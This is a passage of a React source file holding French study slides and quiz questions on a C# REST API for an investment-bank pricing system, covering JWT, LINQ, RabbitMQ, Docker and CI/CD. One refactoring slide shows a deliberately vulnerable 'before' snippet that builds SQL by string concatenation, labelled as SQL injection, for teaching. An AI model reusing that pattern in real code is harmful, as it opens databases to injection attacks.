// src/projects/CIBPricing/CIBRestApiInfraQCM.js

import React, { useState, useEffect } from "react";
import "./Page.css";

const basicSlides = [
  {
    "question": "Vue d'ensemble — API REST C# comme objet central du système MAPS Pricing",
    "answer": "**L'API REST est le pivot de l'architecture** : point d'entrée unique pour le booking, le pricing, la récupération d'ISIN et la consultation du référentiel. Tous les clients (OMS, blotter, risk) passent par elle. ◆ **Endpoints principaux** : `POST /api/v1/booking` (créer un trade), `GET /api/v1/instruments/{isin}` (consulter le référentiel), `POST /api/v1/pricing/calculate` (déclencher un pricing), `GET /api/v1/pricing/greeks/{tradeId}` (lire les Greeks calculés). ◆ **Pipeline interne** : HTTP Request → Authentication Middleware (JWT) → Authorization Policy → Model Binding + Validation → Controller → Service Layer → MSMQ/RabbitMQ → DataSynapse → SQL Server. ◆ **Performance** : Multithreading (`Task.WhenAll`, `Parallel.For`), gestion mémoire (`ArrayPool`, `Span<T>`), cache Redis, connection pooling SQL. ◆ **Infrastructure** : Docker containers, microservices, Azure DevOps CI/CD, TFS, .NET 4.8 / .NET 8."
  },
  {
    "question": "REST API ASP.NET Core — Anatomie d'un endpoint de booking CIB",
    "answer": "**Controller** : `[ApiController][Route(\"api/v1/booking\")] public class BookingController : ControllerBase`. ◆ **Endpoint** : `[HttpPost][Authorize(Policy=\"CanBook\")] public async Task<IActionResult> BookTrade([FromBody] BookingRequest request, CancellationToken ct)`. ◆ **Pipeline complet** : `[HttpPost]` → ModelState validation automatique (`[ApiController]`) → `[Authorize]` vérifie JWT → `BookingRequest` désérialisé depuis le body JSON → FluentValidation → `_bookingService.BookAsync(request, ct)` → `Created(uri, response)` ou `BadRequest(errors)`. ◆ **Codes retour** : 201 Created (booking OK), 400 Bad Request (validation échoue), 401 Unauthorized (JWT absent/invalide), 403 Forbidden (rôle insuffisant), 409 Conflict (idempotency key déjà utilisée), 503 Service Unavailable (Sophis down, circuit ouvert). ◆ **Versioning URL** : `/api/v1/` — jamais modifier v1, créer `/api/v2/` pour les breaking changes."
  },
  {
    "question": "Sécurité API REST — JWT, Policies, HTTPS, validation dans MAPS",
    "answer": "**JWT Bearer** : `services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(o => { o.TokenValidationParameters = new TokenValidationParameters { ValidIssuer = config[\"Jwt:Issuer\"], ValidAudience = \"maps-api\", IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(config[\"Jwt:Secret\"])), ValidateLifetime = true }; });` ◆ **Policies** : `services.AddAuthorization(o => { o.AddPolicy(\"CanBook\", p => p.RequireRole(\"TRADER\", \"SALES\")); o.AddPolicy(\"EquityDesk\", p => p.RequireClaim(\"desk\", \"equity\")); });` ◆ **HTTPS** : `app.UseHsts(); app.UseHttpsRedirection();` — TLS 1.2+ obligatoire en CIB. ◆ **Validation** : `[ApiController]` retourne 400 automatiquement si ModelState invalide. FluentValidation pour les règles métier (Strike > 0, Maturity > Today, ISIN format). ◆ **Audit MiFID II** : chaque requête enrichie du claim `userId` pour le logging structuré."
  },
  {
    "question": "Gestion de N endpoints — Versioning, routing, middlewares",
    "answer": "**Routing attributs** : `[Route(\"api/v{version:apiVersion}/[controller]\")]` + `services.AddApiVersioning()`. ◆ **Endpoints multiples** : `BookingController` (POST /booking), `InstrumentController` (GET /instruments/{isin}, GET /instruments?underlyingId={id}&type={type}), `PricingController` (POST /pricing/calculate, GET /pricing/greeks/{id}, GET /pricing/status/{jobId}), `ReferentielController` (GET /referentiel/instruments, POST /referentiel/instruments/sync). ◆ **Middleware pipeline** : `UseRouting` → `UseAuthentication` → `UseAuthorization` → `UseRateLimiting` → `MapControllers`. ◆ **Rate limiting** : `services.AddRateLimiter(o => o.AddFixedWindowLimiter(\"api\", opt => { opt.PermitLimit = 100; opt.Window = TimeSpan.FromMinutes(1); }));` ◆ **Health checks** : `GET /health` (liveness), `GET /health/ready` (readiness — Sophis up + SQL accessible + Redis disponible). Docker probe utilise ces endpoints."
  },
  {
    "question": "Multithreading C# — Pipeline de pricing haute performance",
    "answer": "**`async/await` (I/O-bound)** : libère le thread pendant l'attente réseau/DB. `var isin = await _isinService.ResolveAsync(id, ct)` — le thread HTTP sert d'autres requêtes pendant l'appel Sophis. ◆ **`Task.WhenAll` (parallélisme logique)** : `var (greeks, position, limit) = await (ComputeGreeksAsync(), GetPositionAsync(), CheckLimitAsync()).WhenAll()` — les 3 appels partent simultanément, résultat quand le plus lent finit. ◆ **`Parallel.For` (CPU-bound)** : `Parallel.For(0, N_SIMS, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount }, i => { payoffs[i] = SimulatePath(option, md); });` ◆ **`Channel<T>` (pipeline)** : `Channel<PricingRequest>.CreateBounded(new BoundedChannelOptions(1000) { FullMode = BoundedChannelFullMode.Wait })` — backpressure native, remplace les `ConcurrentQueue` avec polling. ◆ **`CancellationToken`** : propagé depuis le `HttpContext.RequestAborted` jusqu'aux appels SQL/Sophis — annulation propre si le client ferme la connexion."
  },
  {
    "question": "Gestion mémoire C# — Optimisation du référentiel de données",
    "answer": "**`Span<T>` / `ReadOnlySpan<T>`** : manipulation de données sans allocation heap. `ReadOnlySpan<char> isinSpan = isin.AsSpan(); var prefix = isinSpan.Slice(0, 2);` — zéro allocation pour parser les ISIN. ◆ **`ArrayPool<T>`** : `var buf = ArrayPool<double>.Shared.Rent(252); try { /* Monte Carlo path */ } finally { ArrayPool<double>.Shared.Return(buf); }` — pool de buffers réutilisés, GC pressure proche de zéro. ◆ **`struct` pour les Greeks** : `readonly struct Greeks { public decimal Delta; public decimal Gamma; public decimal Vega; public decimal Theta; }` — alloué sur la stack, pas sur le heap. ◆ **`IDisposable` / `using`** : `using var conn = new SqlConnection(cs);` — libération immédiate des connexions non managées. ◆ **`ObjectPool<T>`** : `services.AddSingleton<ObjectPool<PricingContext>>(sp => new DefaultObjectPool<PricingContext>(new PricingContextPolicy()))` — réutilisation des contextes de pricing coûteux à créer."
  },
  {
    "question": "LINQ — Requêtes sur les instruments et positions dans MAPS",
    "answer": "**LINQ to Objects** : `var equityOptions = instruments.Where(i => i.Type == InstrumentType.Option && i.Underlying.AssetClass == AssetClass.Equity).OrderBy(i => i.Maturity).Select(i => new InstrumentDto(i.Isin, i.Strike, i.Maturity)).ToList();` ◆ **LINQ to SQL (Dapper)** : `var result = await conn.QueryAsync<Instrument>(\"SELECT ISIN, Strike, Maturity FROM Instruments WHERE UnderlyingId = @id AND Type = @type\", new { id, type });` ◆ **LINQ to EF Core** : `var trades = await _context.Trades.Include(t => t.Instrument).Where(t => t.DeskId == deskId && t.TradeDate >= DateTime.Today).AsNoTracking().ToListAsync();` ◆ **Performance LINQ** : `AsNoTracking()` pour les lectures seules (évite le change tracking). `IQueryable<T>` vs `IEnumerable<T>` — ne jamais `.ToList()` avant le filtre (charge tout en mémoire). `.Any()` plutôt que `.Count() > 0`. `Select()` avant `ToList()` pour réduire les colonnes SQL. ◆ **GroupBy** : `trades.GroupBy(t => t.Desk).Select(g => new { Desk = g.Key, TotalNotional = g.Sum(t => t.Notional) })`"
  },
  {
    "question": "MSMQ vs RabbitMQ — Choix et migration dans MAPS",
    "answer": "**MSMQ** : `System.Messaging.MessageQueue mq = new MessageQueue(\".\\\\Private$\\\\PricingQueue\"); mq.Send(new Message(request) { Formatter = new XmlMessageFormatter() });` Windows uniquement, .NET Framework 4.8, transactionnel local, pas de broker, difficile à monitorer. ◆ **RabbitMQ** : `IChannel channel = await connection.CreateChannelAsync(); await channel.BasicPublishAsync(exchange: \"maps\", routingKey: \"pricing.request\", body: JsonSerializer.SerializeToUtf8Bytes(request));` Broker centralisé AMQP, exchanges flexibles, dead-letter queues, plugins de monitoring, multi-langage, cloud-native. ◆ **Abstraction `IMessageBus`** : `interface IMessageBus { Task PublishAsync<T>(string routingKey, T message, CancellationToken ct); }` — `MsmqMessageBus` (net48), `RabbitMqMessageBus` (net8.0). Le code métier ne change pas lors de la migration. ◆ **Dead-letter queue RabbitMQ** : `channel.QueueDeclare(\"pricing.dlq\", arguments: new Dictionary<string,object>{{ \"x-dead-letter-exchange\", \"maps.dlx\" }})` — les messages rejetés (ISIN invalide, timeout) sont inspectables et rejouables."
  },
  {
    "question": "Microservices — Découpage de MAPS en services indépendants",
    "answer": "**Services identifiés** : `InstrumentService` (ISIN, référentiel, cache), `PricingService` (Black-Scholes, Heston, Monte Carlo via DataSynapse), `BookingService` (création trade dans Sophis), `RiskService` (Greeks, limites, VaR), `MarketDataService` (spots, vols, taux depuis Bloomberg/Reuters). ◆ **Communication** : synchrone REST (booking → instrument via `HttpClient` typé), asynchrone RabbitMQ (pricing → risk via événements `PricingCompleted`). ◆ **API Gateway** : point d'entrée unique devant tous les microservices — authentification centralisée, rate limiting, routing. `Ocelot` ou `YARP` (Yet Another Reverse Proxy) en C#. ◆ **Problème shared DB** : chaque microservice a sa propre DB (DB per service pattern) — `InstrumentService` → `InstrumentsDb`, `BookingService` → `BookingDb`. Pas de joins cross-services. ◆ **Service discovery** : `Consul` ou Kubernetes Services pour que `BookingService` trouve `InstrumentService` dynamiquement."
  },
  {
    "question": "Docker — Containerisation des services MAPS",
    "answer": "**Dockerfile multi-stage** : `FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build; COPY . .; RUN dotnet publish -c Release -o /app; FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS runtime; COPY --from=build /app .; ENTRYPOINT [\"dotnet\", \"Maps.BookingService.dll\"]` ◆ **Docker Compose dev** : `services: booking-api: build: . ports: [\"5001:8080\"] depends_on: [sql-server, rabbitmq, redis] environment: [ConnectionStrings__Default=..., Jwt__Secret=...]` ◆ **Health checks Docker** : `HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost:8080/health || exit 1` — Docker/Kubernetes redémarre le container si unhealthy. ◆ **Multi-target** : `FROM mcr.microsoft.com/dotnet/framework/aspnet:4.8 AS runtime-legacy` pour le service Sophis (net48 Windows). ◆ **Volumes** : logs et config montés en volume, pas dans l'image. Secrets via variables d'environnement ou Kubernetes Secrets. ◆ **Image size** : `alpine` base image pour .NET 8, `--no-restore` trick pour optimiser les layers."
  },
  {
    "question": "Azure DevOps CI/CD — Pipeline MAPS multi-target",
    "answer": "**Pipeline YAML** : `trigger: branches: include: [main, release/*] stages: [Build, Test, Package, Deploy]` ◆ **Stage Build** : `dotnet restore → dotnet build --configuration Release /p:TreatWarningsAsErrors=true → dotnet test --collect:\"XPlat Code Coverage\" → dotnet publish -o $(Build.ArtifactStagingDirectory)` ◆ **Multi-target build** : `dotnet build -f net48 && dotnet build -f net8.0` — les deux TFMs validés dans la même CI. ◆ **Stage Package** : `docker build -t maps-booking-api:$(Build.BuildId) . → docker push $(ACR)/maps-booking-api:$(Build.BuildId)` ◆ **Stage Deploy UAT** : `kubectl set image deployment/booking-api container=$(ACR)/maps-booking-api:$(Build.BuildId) -n uat` ◆ **Stage Deploy PROD** : gate d'approbation manuelle + smoke test `GET /health` + rollback automatique si smoke test échoue. ◆ **Branch policies** : PR obligatoire, minimum 2 reviewers, build CI doit passer — conformité réglementaire SOX."
  },
  {
    "question": "Techniques d'optimisation — Choix et trade-offs en C# CIB",
    "answer": "**Cache multi-niveaux** : L1 `ConcurrentDictionary` (< 0.1ms, hot path ISIN), L2 `IMemoryCache` (< 1ms, TTL 30min), L3 Redis `IDistributedCache` (< 2ms, multi-instances), L4 SQL Server (fallback, 10-100ms). ◆ **Choix async vs Parallel** : `async/await` pour I/O-bound (DB, Sophis, HTTP), `Parallel.For` pour CPU-bound (Monte Carlo, Greeks par différences finies). Ne pas mélanger : `async` dans `Parallel.For` = deadlock potentiel. ◆ **`record` vs `class` vs `struct`** : `record` pour les DTOs immuables (BookingRequest, GreeksResult), `class` pour les entités avec cycle de vie (PricingContext), `struct` pour les types valeur légers (Greeks, Point). ◆ **Connection pooling SQL** : `MaxPoolSize=100` dans la connection string — jamais ouvrir une connexion par requête de pricing. ◆ **EF Core vs Dapper** : EF Core pour les writes complexes avec transactions (booking), Dapper pour les reads haute performance (référentiel ISIN, 1000 req/sec)."
  },
  {
    "question": "Patterns d'API REST — Idempotence, pagination, filtering, HATEOAS",
    "answer": "**Idempotence** : `[HttpPost] public async Task<IActionResult> BookTrade([FromHeader(Name=\"Idempotency-Key\")] string idempotencyKey, [FromBody] BookingRequest req)` — vérifier la clé en base avant de booker. 409 Conflict si déjà traitée. ◆ **Pagination** : `GET /api/v1/instruments?page=2&pageSize=50&sortBy=maturity&sortDir=asc` → `{ data: [...], totalCount: 1200, page: 2, pageSize: 50, hasNext: true }`. Cursor-based pour les gros volumes. ◆ **Filtering** : `GET /api/v1/instruments?underlyingId=BNPP&type=Call&maturityFrom=2025-01-01&strike=55` → LINQ dynamique ou `Specifications pattern`. ◆ **Partial update** : `PATCH /api/v1/booking/{id}` avec `JsonPatchDocument<BookingRequest>` — ne modifier que les champs envoyés. ◆ **Async long-running** : `POST /api/v1/pricing/calculate` → 202 Accepted + `{ jobId: \"...\", statusUrl: \"/api/v1/pricing/status/{jobId}\" }` → `GET /api/v1/pricing/status/{jobId}` → 200 + résultats ou 202 si encore en cours."
  },
  {
    "question": "SQL Server + Dapper + EF Core — Stratégies d'accès données dans MAPS",
    "answer": "**Dapper (lectures haute fréquence)** : `var instruments = await conn.QueryAsync<InstrumentDto>(\"SELECT ISIN, Strike, Maturity, UnderlyingId FROM Instruments WITH(NOLOCK) WHERE UnderlyingId = @id\", new { id }, commandTimeout: 3);` — SQL brut, mapping direct, < 1ms avec index. ◆ **EF Core (écritures transactionnelles)** : `using var tx = await _context.Database.BeginTransactionAsync(); _context.Trades.Add(trade); _context.AuditLogs.Add(auditEntry); await _context.SaveChangesAsync(); await tx.CommitAsync();` ◆ **Repository pattern** : `IInstrumentRepository` (Dapper impl), `ITradeRepository` (EF Core impl) — le service ne sait pas quel ORM. ◆ **Index stratégiques** : `CREATE INDEX IX_Instruments_ISIN ON Instruments(ISIN) INCLUDE(Strike, Maturity, Type)` — covering index, zéro key lookup. `CREATE INDEX IX_Trades_DeskDate ON Trades(DeskId, TradeDate DESC)` — requêtes de blotter. ◆ **Bulk insert** : `SqlBulkCopy` ou EF Core `BulkInsert` pour les syncs referentiel (milliers de lignes)."
  },
  {
    "question": "Gestion des erreurs API REST — ProblemDetails, middleware global, Polly",
    "answer": "**ProblemDetails (RFC 7807)** : `services.AddProblemDetails()` — format standardisé : `{ type: \"https://maps.bnp/errors/booking-failed\", title: \"Booking Failed\", status: 400, detail: \"ISIN FR0000131104 not found in Sophis\", tradeId: \"...\", correlationId: \"...\" }` ◆ **Middleware global** : `app.UseExceptionHandler(a => a.Run(async ctx => { var ex = ctx.Features.Get<IExceptionHandlerFeature>(); _logger.LogError(ex.Error, \"Unhandled {CorrelationId}\", ctx.TraceIdentifier); await ctx.Response.WriteAsJsonAsync(new ProblemDetails { Status = 500 }); }));` — jamais exposer les stack traces. ◆ **Polly resilience pipeline** : `services.AddHttpClient<ISophisAdapter>().AddResilienceHandler(\"sophis\", b => b.AddRetry(new RetryStrategyOptions { MaxRetryAttempts = 3, Delay = TimeSpan.FromSeconds(1), BackoffType = DelayBackoffType.Exponential }).AddCircuitBreaker(new CircuitBreakerStrategyOptions { FailureRatio = 0.5, SamplingDuration = TimeSpan.FromSeconds(30) }).AddTimeout(TimeSpan.FromSeconds(5)));` ◆ **Correlation ID** : middleware injecte `X-Correlation-ID` dans chaque réponse — propagé à tous les services downstream."
  },
  {
    "question": "DataSynapse — Calcul distribué intégré dans le pipeline REST",
    "answer": "**Pattern Async Job** : `POST /api/v1/pricing/calculate` → controller appelle `_pricingJobService.SubmitAsync(request)` → `DataSynapseClient.SubmitJob(job)` → retour immédiat du `jobId` → 202 Accepted. ◆ **Polling** : `GET /api/v1/pricing/status/{jobId}` → `DataSynapseClient.GetJobStatus(jobId)` → `{ status: \"RUNNING\" | \"COMPLETED\" | \"FAILED\", progress: 75, greeks: null | {...} }`. ◆ **Abstraction** : `interface IComputeEngine { Task<string> SubmitJobAsync(PricingJob job, CancellationToken ct); Task<JobResult> GetResultAsync(string jobId, CancellationToken ct); }` — `DataSynapseEngine` (production) et `LocalParallelEngine` (dev/test, `Parallel.For` local). ◆ **Timeout + DLQ** : si le job DataSynapse dépasse 30s, le service le marque `TIMEOUT`, publie sur la dead-letter queue RabbitMQ pour rejeu. ◆ **Message RabbitMQ** : `PricingJobCompleted { JobId, GreeksJson, Duration, Timestamp }` publié quand DataSynapse répond — consommé par le blotter via WebSocket."
  },
  {
    "question": "Tests — Stratégie complète pour l'API REST MAPS",
    "answer": "**Tests unitaires (xUnit + Moq)** : `var mockRepo = new Mock<IInstrumentRepository>(); mockRepo.Setup(r => r.GetByIsinAsync(\"FR0000131104\", It.IsAny<CancellationToken>())).ReturnsAsync(instrument); var sut = new BookingService(mockRepo.Object, mockBus.Object, mockLogger.Object);` ◆ **Tests d'intégration (WebApplicationFactory)** : `var factory = new WebApplicationFactory<Program>().WithWebHostBuilder(b => b.ConfigureServices(s => s.AddSingleton<ISophisAdapter>(mockSophis.Object))); var client = factory.CreateClient(); var resp = await client.PostAsJsonAsync(\"/api/v1/booking\", request);` — teste le pipeline HTTP complet (auth, routing, validation, middleware) sans déploiement. ◆ **Testcontainers** : `var sql = new MsSqlBuilder().Build(); var rabbit = new RabbitMqBuilder().Build();` — vraies instances Docker dans les tests CI. ◆ **BenchmarkDotNet** : `[Benchmark] public Task PriceBook_Sequential()` vs `[Benchmark] public Task PriceBook_Parallel()` — mesure des gains de refactoring. ◆ **Tests de contrat** : `PactNet` entre `BookingService` (producer) et `OmsService` (consumer)."
  },
  {
    "question": "Refactoring — De l'appel direct Sophis à l'architecture propre",
    "answer": "**Avant** : `public IActionResult BookTrade(BookingRequest req) { var conn = new SqlConnection(\"...\"); var isin = conn.ExecuteScalar<string>(\"SELECT ISIN FROM Instruments WHERE Id=\" + req.Id); /* SQL injection! */ var sophis = new SophisComAdapter(); sophis.CreateTrade(isin, req.Notional); return Ok(); }` — 5 violations en 4 lignes. ◆ **Après** : Controller → `IBookingService.BookAsync(request, ct)` → `IIsinService.ResolveAsync(id, ct)` (cache-aside + `ISophisAdapter`) → `ITradeRepository.CreateAsync(trade, ct)` (EF Core + transaction) → `IMessageBus.PublishAsync(\"trade.booked\", event, ct)` (RabbitMQ). ◆ **Gains** : SRP (chaque service a une responsabilité), DIP (interfaces injectées), testabilité (mocks), résilience (Polly sur `ISophisAdapter`), observabilité (structured logging à chaque étape), OCP (nouvelle source ISIN = nouvelle implémentation `ISophisAdapter`, zéro modification). ◆ **Mesure** : BenchmarkDotNet avant/après — latence, allocations GC."
  },
  {
    "question": "Observabilité — Logging, métriques, tracing dans MAPS",
    "answer": "**Structured logging Serilog** : `Log.ForContext(\"TradeId\", tradeId).ForContext(\"ISIN\", isin).ForContext(\"Desk\", desk).Information(\"Trade booked {Notional} EUR\", notional)` — chaque log enrichi du contexte métier, indexé dans Elasticsearch/Splunk. ◆ **Métriques Prometheus** : `var bookingCounter = Metrics.CreateCounter(\"maps_bookings_total\", \"Total bookings\", new[] { \"desk\", \"status\" }); bookingCounter.WithLabels(\"equity\", \"success\").Inc();` — scrappé par Prometheus, dashboards Grafana. ◆ **Distributed tracing** : `Activity.Current?.AddTag(\"isin\", isin);` + OpenTelemetry — traces Jaeger reconstituent le chemin complet d'une requête à travers les microservices. ◆ **Health checks** : `services.AddHealthChecks().AddSqlServer(cs).AddRabbitMQ(rabbitUri).AddRedis(redisCs).AddUrlGroup(new Uri(sophisUrl + \"/health\"), \"sophis\");` ◆ **Alertes** : Grafana alerte si `maps_booking_errors_total > 10/min` ou `maps_booking_latency_p99 > 500ms`."
  },
  {
    "question": "Sophis + SQL Server + Redis — Référentiel de données optimisé",
    "answer": "**Flux de résolution ISIN** : `BookingRequest.InstrumentId` → L1 `ConcurrentDictionary<string,string> _hotCache` (1000 ISIN les plus fréquents, TTL 15min) → L2 `IMemoryCache` (TTL 30min) → L3 Redis `IDistributedCache` (TTL 4h, partagé entre instances) → L4 `ISophisAdapter.GetISINAsync(id)` → L5 SQL `SELECT ISIN FROM Instruments WHERE InternalId = @id` (index covering). ◆ **Cache warming** : au démarrage du service, `IHostedService.StartAsync()` précharge les 1000 ISIN les plus demandés dans L1 depuis Redis. ◆ **Invalidation** : Kafka event `InstrumentUpdated` consommé → suppression des entrées invalidées dans Redis + MemoryCache. ◆ **Monitoring** : métriques `cache_hit_ratio` par niveau — objectif > 98% sur L1+L2+L3 combinés en période de marché. ◆ **Sophis COM/API** : accès wrappé dans `ISophisAdapter` avec Polly (retry 3×, circuit breaker 30s, timeout 5s)."
  },
  {
    "question": "Patterns de choix techniques — Quand utiliser quoi dans MAPS",
    "answer": "**`async/await` vs `Parallel.For`** : I/O-bound (DB, Sophis, HTTP) → `async/await`. CPU-bound (Monte Carlo, Greeks) → `Parallel.For`. Ne jamais utiliser `Parallel.ForEachAsync` sans comprendre le scheduler. ◆ **EF Core vs Dapper** : writes transactionnels avec relations → EF Core. Reads haute fréquence, SQL précis → Dapper. Les deux ensemble via Repository pattern. ◆ **MSMQ vs RabbitMQ** : legacy .NET 4.8 Windows → MSMQ (avec `IMessageBus` abstraction). Nouveaux services, multi-instances, monitoring → RabbitMQ. ◆ **Redis vs MemoryCache** : multi-instances → Redis. Single instance ou cache très froid → `IMemoryCache`. Les deux en L2/L3. ◆ **REST vs gRPC** : communication externe (OMS, blotter) → REST (standard, tooling riche). Communication interne microservices haute fréquence (> 10k req/s) → gRPC (binaire, streaming, IDL). ◆ **Docker vs IIS** : nouveaux services .NET 8 → Docker. Legacy .NET 4.8 (Sophis COM, MSMQ) → IIS Windows. ◆ **Microservice vs monolithe** : new features → microservice. Migration legacy → Strangler Fig pattern."
  },
  {
    "question": ".NET 4.8 et .NET 8 — Coexistence dans l'infrastructure MAPS",
    "answer": "**Multi-target library** : `<TargetFrameworks>net48;net8.0</TargetFrameworks>` + `#if NET48 / #else / #endif` pour les divergences (System.Messaging / RabbitMQ.Client). ◆ **Services .NET 4.8** : `Maps.SophisAdapter` (COM Sophis, Windows uniquement), `Maps.MsmqBus` (MSMQ legacy), `Maps.DataSynapseClient` (lib tierce non migrée). Hébergés sur IIS Windows Server. ◆ **Services .NET 8** : `Maps.BookingApi`, `Maps.PricingApi`, `Maps.InstrumentService` — cross-platform, conteneurisés, déployés dans Kubernetes. ◆ **Communication** : les services .NET 8 appellent les services .NET 4.8 via REST ou via `IMessageBus` RabbitMQ — jamais de référence directe entre assemblies de TFM différents. ◆ **Migration progressive** : Strangler Fig — extraire `BookingService` de l'application .NET 4.8 monolithique vers un nouveau service .NET 8, router via YARP (reverse proxy C#). ◆ **CI/CD** : pipeline Azure DevOps valide les deux TFMs dans la même exécution."
  }
];

const questions = {
  moyen: [
    {
      "question": "[Terme → Définition] Dans une API REST ASP.NET Core, quel est le rôle du middleware `[ApiController]` sur un `BookingController` ?",
      "options": [
        "Il enregistre le controller dans le conteneur d'injection de dépendances.",
        "Il active la validation automatique du ModelState (retourne 400 si le body JSON est invalide), le binding depuis les attributs sources (`[FromBody]`, `[FromRoute]`) et les réponses d'erreur standardisées.",
        "Il configure les routes HTTP pour tous les endpoints du controller.",
        "Il active l'authentification JWT sur tous les endpoints du controller."
      ],
      "answer": "Il active la validation automatique du ModelState (retourne 400 si le body JSON est invalide), le binding depuis les attributs sources (`[FromBody]`, `[FromRoute]`) et les réponses d'erreur standardisées.",
      "explanation": "`[ApiController]` est une convention ASP.NET Core qui active 3 comportements : (1) ModelState automatique — si `BookingRequest` a un champ `[Required]` absent, retour 400 sans écrire de code. (2) Binding automatique — `[FromBody]` pour les POST, `[FromRoute]` pour `{id}`, `[FromQuery]` pour les query params. (3) Format d'erreur standardisé — `ValidationProblemDetails`. Sans `[ApiController]`, il faut écrire `if (!ModelState.IsValid) return BadRequest(ModelState);` manuellement dans chaque action."
    },
    {
      "question": "[Terme → Définition] Quelle est la différence entre `[Authorize]` et `[Authorize(Policy=\"CanBook\")]` sur un endpoint de booking dans MAPS ?",
      "options": [
        "Ce sont des équivalents — `Policy` est optionnel.",
        "`[Authorize]` vérifie uniquement qu'un JWT valide est présent. `[Authorize(Policy=\"CanBook\")]` vérifie en plus que le token satisfait des règles supplémentaires (rôle TRADER, claim desk=equity).",
        "`[Authorize(Policy)]` est uniquement pour les endpoints de lecture, pas d'écriture.",
        "`[Authorize]` est pour .NET 4.8, `[Authorize(Policy)]` est pour .NET 8 uniquement."
      ],
      "answer": "`[Authorize]` vérifie uniquement qu'un JWT valide est présent. `[Authorize(Policy=\"CanBook\")]` vérifie en plus que le token satisfait des règles supplémentaires (rôle TRADER, claim desk=equity).",
      "explanation": "En CIB, la granularité d'autorisation est critique : un Sales ne devrait pas pouvoir booker les mêmes produits qu'un Trader. `[Authorize]` = authentification minimum (JWT valide, non expiré). `Policy` = autorisation fine : `services.AddAuthorization(o => o.AddPolicy(\"CanBook\", p => p.RequireRole(\"TRADER\").RequireClaim(\"desk\", \"equity\")))`. Un utilisateur authentifié peut quand même recevoir 403 Forbidden si sa policy n'est pas satisfaite."
    },
    {
      "question": "[Définition → Terme] Dans LINQ, quelle est la différence critique entre `IQueryable<T>` et `IEnumerable<T>` pour une requête sur le référentiel d'instruments ?",
      "options": [
        "Ce sont des interfaces identiques, le choix n'a pas d'impact.",
        "`IQueryable<T>` traduit les opérations LINQ en SQL côté serveur (seules les lignes filtrées sont transférées). `IEnumerable<T>` charge TOUT en mémoire puis filtre côté client.",
        "`IQueryable<T>` est uniquement compatible avec EF Core, `IEnumerable<T>` avec Dapper.",
        "`IEnumerable<T>` est plus performant car il utilise le cache CPU."
      ],
      "answer": "`IQueryable<T>` traduit les opérations LINQ en SQL côté serveur (seules les lignes filtrées sont transférées). `IEnumerable<T>` charge TOUT en mémoire puis filtre côté client.",
      "explanation": "Différence de performance critique en CIB avec 500k instruments : `IQueryable<T>` → EF Core génère `SELECT ... WHERE UnderlyingId=@id LIMIT 50` → 50 lignes transférées. `IEnumerable<T>` → `SELECT * FROM Instruments` → 500k lignes chargées en RAM, filtrées côté .NET. Anti-pattern classique : `_context.Instruments.ToList().Where(i => i.UnderlyingId == id)` — le `.ToList()` force l'exécution avant le `.Where()`. Règle : ne jamais appeler `.ToList()`, `.ToArray()` ou `.AsEnumerable()` avant les filtres LINQ sur un `IQueryable`."
    },
    {
      "question": "[Caractéristiques → Concept] `ArrayPool<double>.Shared.Rent(252)` + `try/finally { ArrayPool<double>.Shared.Return(buf) }` dans une boucle Monte Carlo de 100k simulations. Quel problème résout ce pattern ?",
      "options": [
        "Il garantit que les tableaux sont initialisés à zéro avant utilisation.",
        "Il évite 100k allocations heap de 252 doubles — réutilise les mêmes buffers via un pool, réduisant la pression GC et les pauses de collecte.",
        "Il synchronise l'accès concurrent aux buffers sous `Parallel.For`.",
        "Il compresse les données en mémoire pour réduire l'empreinte RAM."
      ],
      "answer": "Il évite 100k allocations heap de 252 doubles — réutilise les mêmes buffers via un pool, réduisant la pression GC et les pauses de collecte.",
      "explanation": "Sans `ArrayPool` : 100k × 252 × 8 bytes = ~200MB alloués + collectés à chaque pricing → Gen2 GC toutes les quelques secondes → pauses de 50-200ms. Le trader attend. Avec `ArrayPool` : les threads louent un buffer existant, l'utilisent, le rendent. En régime permanent, le pool contient autant de buffers que de threads actifs — allocation quasi-nulle. Le `try/finally` est indispensable pour garantir le `Return()` même en cas d'exception (sinon le pool se vide progressivement)."
    },
    {
      "question": "[Terme → Définition] Qu'est-ce qu'une dead-letter queue (DLQ) RabbitMQ et quel cas d'usage couvre-t-elle dans MAPS ?",
      "options": [
        "Une queue prioritaire pour les messages urgents de booking.",
        "Une queue de destination pour les messages rejetés ou expirés — un booking échoué (ISIN invalide, Sophis timeout) est redirigé vers la DLQ pour inspection et rejeu sans perdre le message.",
        "Une queue d'archivage pour la conformité MiFID II.",
        "Une queue de backup activée uniquement si le broker principal est down."
      ],
      "answer": "Une queue de destination pour les messages rejetés ou expirés — un booking échoué (ISIN invalide, Sophis timeout) est redirigé vers la DLQ pour inspection et rejeu sans perdre le message.",
      "explanation": "En CIB, perdre silencieusement un message de booking est inacceptable — un trade non enregistré = position incorrecte = risque réglementaire. La DLQ capture les messages avec `x-death` headers (raison du rejet, tentatives, timestamp). L'équipe support peut inspecter via le plugin de management RabbitMQ, corriger l'anomalie (ex : créer l'ISIN manquant dans Sophis) et rejouer le message. Configuration : `x-dead-letter-exchange` sur la queue principale pointe vers un exchange dédié à la DLQ."
    },
    {
      "question": "[Terme → Définition] Quelle est la différence entre `Task.WhenAll` et `Parallel.For` pour les opérations dans le service de pricing MAPS ?",
      "options": [
        "Ce sont des synonymes — seule la syntaxe diffère.",
        "`Task.WhenAll` est pour les opérations I/O-bound (plusieurs appels async simultanés : SQL, Sophis, Redis). `Parallel.For` est pour les opérations CPU-bound (Monte Carlo, calcul de Greeks par différences finies sur un book entier).",
        "`Task.WhenAll` utilise un seul thread, `Parallel.For` en utilise plusieurs.",
        "`Parallel.For` est déprécié en .NET 8 — utiliser uniquement `Task.WhenAll`."
      ],
      "answer": "`Task.WhenAll` est pour les opérations I/O-bound (plusieurs appels async simultanés : SQL, Sophis, Redis). `Parallel.For` est pour les opérations CPU-bound (Monte Carlo, calcul de Greeks par différences finies sur un book entier).",
